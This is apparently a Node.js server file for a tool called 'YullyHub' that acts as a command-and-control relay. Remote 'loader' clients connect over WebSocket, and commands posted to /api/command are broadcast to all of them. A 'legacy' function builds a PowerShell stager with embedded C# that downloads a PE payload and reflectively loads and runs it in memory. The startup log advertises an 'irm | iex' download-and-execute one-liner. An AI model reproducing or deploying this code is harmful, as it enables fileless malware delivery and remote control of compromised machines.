const { createServer } = require('http');
const { parse } = require('url');
const path = require('path');
const fs = require('fs');
const next = require('next');
const { WebSocketServer } = require('ws');

const dev = process.env.NODE_ENV !== 'production';
const port = 3000;

const app = next({ dev });
const handle = app.getRequestHandler();

const loaders = new Set();
const uiClients = new Set();

function loaderStateSnapshot() {
    return {
        online: loaders.size > 0,
        count: loaders.size,
        agents: [...loaders].map(w => w._info || {}),
    };
}

function broadcastToUI(event) {
    const msg = JSON.stringify(event);
    for (const c of uiClients) {
        if (c.readyState === 1) c.send(msg);
    }
}

function pushState() {
    broadcastToUI({ type: 'state', ...loaderStateSnapshot() });
}

function broadcastCommand(cmd) {
    const msg = JSON.stringify(cmd);
    let sent = 0;
    for (const ws of loaders) {
        if (ws.readyState === 1) { ws.send(msg); sent++; }
    }
    return sent;
}

// /loader and the loader.exe binary are now served by:
//   * app/loader/route.js       (Next.js app-router route, works on Vercel too)
//   * public/loader.exe          (static, Next.js serves at /loader.exe)
// so this custom server no longer intercepts them — the Next handler
// resolves both. Kept the WebSocket relay endpoints below because those
// need long-lived connections that Vercel serverless can't hold.

// Legacy — no longer used. Left in place so nothing that still references
// buildLoaderPs1 explodes. The active PS bootstrap now lives in
// app/loader/route.js so it works on Vercel too.
function buildLoaderPs1_LEGACY(host) {
    const binUrl = `http://${host}/loader.bin`;
    return `# YullyHub Loader — reflective in-memory launcher
$ErrorActionPreference = 'Stop'
$BinUrl = '${binUrl}'

$csharp = @'
using System;
using System.Runtime.InteropServices;

public static class RPE {
    [DllImport("kernel32.dll")]  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]  public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]  public static extern IntPtr LoadLibraryA(string lpLibFileName);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]  public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);
    [DllImport("kernel32.dll")]  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]  public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Run(byte[] raw) {
        int e_lfanew = BitConverter.ToInt32(raw, 0x3C);
        // IMAGE_NT_HEADERS64
        ushort machine = BitConverter.ToUInt16(raw, e_lfanew + 4);
        if (machine != 0x8664) throw new Exception("Only x64 payloads supported");
        ushort numSections    = BitConverter.ToUInt16(raw, e_lfanew + 6);
        ushort sizeOptionalHdr = BitConverter.ToUInt16(raw, e_lfanew + 20);
        int optHdrOff = e_lfanew + 24;
        uint addrOfEntry = BitConverter.ToUInt32(raw, optHdrOff + 16);
        ulong prefImageBase = BitConverter.ToUInt64(raw, optHdrOff + 24);
        uint sizeOfImage    = BitConverter.ToUInt32(raw, optHdrOff + 56);
        uint sizeOfHeaders  = BitConverter.ToUInt32(raw, optHdrOff + 60);
        // Data directories start at optHdrOff + 112 in PE32+
        int dataDirOff = optHdrOff + 112;
        uint importRva  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 1);
        uint relocRva   = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5);
        uint relocSize  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5 + 4);
        uint tlsRva     = BitConverter.ToUInt32(raw, dataDirOff + 8 * 9);

        IntPtr baseAddr = VirtualAlloc((IntPtr)prefImageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero)
            baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) throw new Exception("VirtualAlloc failed");

        Marshal.Copy(raw, 0, baseAddr, (int)sizeOfHeaders);
        int secTableOff = optHdrOff + sizeOptionalHdr;
        for (int i = 0; i < numSections; i++) {
            int so = secTableOff + i * 40;
            uint vSize = BitConverter.ToUInt32(raw, so + 8);
            uint vAddr = BitConverter.ToUInt32(raw, so + 12);
            uint rawSize = BitConverter.ToUInt32(raw, so + 16);
            uint rawPtr  = BitConverter.ToUInt32(raw, so + 20);
            if (rawSize == 0) continue;
            IntPtr dst = new IntPtr(baseAddr.ToInt64() + vAddr);
            Marshal.Copy(raw, (int)rawPtr, dst, (int)rawSize);
        }

        long delta = baseAddr.ToInt64() - (long)prefImageBase;
        if (delta != 0 && relocSize > 0) {
            int cursor = 0;
            IntPtr relBase = new IntPtr(baseAddr.ToInt64() + relocRva);
            while (cursor < relocSize) {
                IntPtr blk = new IntPtr(relBase.ToInt64() + cursor);
                uint blkRva  = (uint)Marshal.ReadInt32(blk, 0);
                uint blkSize = (uint)Marshal.ReadInt32(blk, 4);
                if (blkSize == 0) break;
                int entries = (int)(blkSize - 8) / 2;
                for (int j = 0; j < entries; j++) {
                    ushort entry = (ushort)Marshal.ReadInt16(blk, 8 + j * 2);
                    int type = entry >> 12;
                    int off  = entry & 0xFFF;
                    if (type == 10) { // IMAGE_REL_BASED_DIR64
                        IntPtr patchAddr = new IntPtr(baseAddr.ToInt64() + blkRva + off);
                        long v = Marshal.ReadInt64(patchAddr);
                        Marshal.WriteInt64(patchAddr, v + delta);
                    }
                }
                cursor += (int)blkSize;
            }
        }

        // Imports
        if (importRva != 0) {
            int impCursor = 0;
            while (true) {
                IntPtr descPtr = new IntPtr(baseAddr.ToInt64() + importRva + impCursor);
                uint origThunk = (uint)Marshal.ReadInt32(descPtr, 0);
                uint nameRva   = (uint)Marshal.ReadInt32(descPtr, 12);
                uint firstThunk = (uint)Marshal.ReadInt32(descPtr, 16);
                if (nameRva == 0 && firstThunk == 0) break;
                string dllName = Marshal.PtrToStringAnsi(new IntPtr(baseAddr.ToInt64() + nameRva));
                IntPtr hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);

                uint thunkRva = origThunk != 0 ? origThunk : firstThunk;
                int idx = 0;
                while (true) {
                    IntPtr thunkPtr = new IntPtr(baseAddr.ToInt64() + thunkRva + idx * 8);
                    IntPtr iatPtr   = new IntPtr(baseAddr.ToInt64() + firstThunk + idx * 8);
                    long thunkVal = Marshal.ReadInt64(thunkPtr);
                    if (thunkVal == 0) break;
                    IntPtr proc;
                    if ((ulong)thunkVal >> 63 == 1) {
                        ushort ordinal = (ushort)(thunkVal & 0xFFFF);
                        proc = GetProcAddress(hMod, (IntPtr)ordinal);
                    } else {
                        IntPtr nameEntry = new IntPtr(baseAddr.ToInt64() + (thunkVal & 0x7FFFFFFF) + 2);
                        string funcName = Marshal.PtrToStringAnsi(nameEntry);
                        proc = GetProcAddress(hMod, funcName);
                    }
                    if (proc == IntPtr.Zero) throw new Exception("GetProcAddress failed");
                    Marshal.WriteInt64(iatPtr, proc.ToInt64());
                    idx++;
                }
                impCursor += 20;
            }
        }

        // Flip everything executable+readable+writable (simpler + reliable
        // for a stub — the target loader is small and short-lived)
        uint oldProt;
        VirtualProtect(baseAddr, sizeOfImage, PAGE_EXECUTE_READWRITE, out oldProt);

        IntPtr entry = new IntPtr(baseAddr.ToInt64() + addrOfEntry);
        IntPtr th = CreateThread(IntPtr.Zero, 0, entry, IntPtr.Zero, 0, IntPtr.Zero);
        if (th == IntPtr.Zero) throw new Exception("CreateThread failed");
        WaitForSingleObject(th, 0xFFFFFFFF);
    }
}
'@

Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction Stop | Out-Null

Write-Host "[YullyHub] fetching payload -> RAM..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData($BinUrl)
Write-Host "[YullyHub] $($bytes.Length) bytes received. Mapping..." -ForegroundColor Cyan
[RPE]::Run($bytes)
`;
}

app.prepare().then(() => {
    const server = createServer((req, res) => {
        const parsedUrl = parse(req.url, true);

        if (req.url === '/api/command' && req.method === 'POST') {
            let body = '';
            req.on('data', c => (body += c));
            req.on('end', () => {
                try {
                    const payload = JSON.parse(body || '{}');
                    if (!payload.type) { res.writeHead(400).end('missing type'); return; }
                    const delivered = broadcastCommand(payload);
                    broadcastToUI({ type: 'command_sent', command: payload.type, payload, delivered, ts: Date.now() });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ ok: true, delivered }));
                } catch (e) {
                    res.writeHead(400).end('bad json');
                }
            });
            return;
        }
        if (req.url === '/api/status' && req.method === 'GET') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(loaderStateSnapshot()));
            return;
        }

        return handle(req, res, parsedUrl);
    });

    const wss = new WebSocketServer({ noServer: true });

    server.on('upgrade', (req, socket, head) => {
        const { pathname } = parse(req.url);
        if (pathname === '/ws' || pathname === '/ws-ui' || pathname === '/ws-island') {
            wss.handleUpgrade(req, socket, head, (ws) => {
                ws._path = pathname;
                wss.emit('connection', ws, req);
            });
        } else {
            socket.destroy();
        }
    });

    const islandClients = new Set();
    function broadcastToIsland(event) {
        const msg = JSON.stringify(event);
        for (const c of islandClients) {
            if (c.readyState === 1) c.send(msg);
        }
    }

    wss.on('connection', (ws, req) => {
        if (ws._path === '/ws') {
            const info = {
                id: Math.random().toString(36).slice(2, 10),
                addr: req.socket.remoteAddress,
                connectedAt: Date.now(),
            };
            ws._info = info;
            loaders.add(ws);
            console.log(`[ws] loader connected id=${info.id} addr=${info.addr} total=${loaders.size}`);
            ws.send(JSON.stringify({ type: 'welcome', id: info.id }));
            broadcastToUI({ type: 'loader_connected', agent: info, ts: Date.now() });
            pushState();
            ws.on('message', (data) => {
                try {
                    const msg = JSON.parse(data.toString());
                    broadcastToUI({ type: 'loader_message', agent: info, message: msg, ts: Date.now() });
                } catch {}
            });
            ws.on('close', () => {
                loaders.delete(ws);
                console.log(`[ws] loader disconnected id=${info.id} total=${loaders.size}`);
                broadcastToUI({ type: 'loader_disconnected', agent: info, ts: Date.now() });
                pushState();
            });
            ws.on('error', () => {});
        } else if (ws._path === '/ws-island') {
            islandClients.add(ws);
            ws.on('close', () => islandClients.delete(ws));
            ws.on('error', () => {});
        } else {
            uiClients.add(ws);
            ws.send(JSON.stringify({ type: 'state', ...loaderStateSnapshot() }));
            ws.on('message', (data) => {
                try {
                    const msg = JSON.parse(data.toString());
                    if (msg && msg.type === 'island') broadcastToIsland(msg);
                } catch {}
            });
            ws.on('close', () => uiClients.delete(ws));
            ws.on('error', () => {});
        }
    });

    server.listen(port, () => {
        console.log(`> dashboard  http://localhost:${port}`);
        console.log(`> loader ws  ws://localhost:${port}/ws`);
        console.log(`> ui ws      ws://localhost:${port}/ws-ui`);
        console.log(`> island ws  ws://localhost:${port}/ws-island`);
        console.log(`> stager     irm http://localhost:${port}/loader | iex`);
    });
});
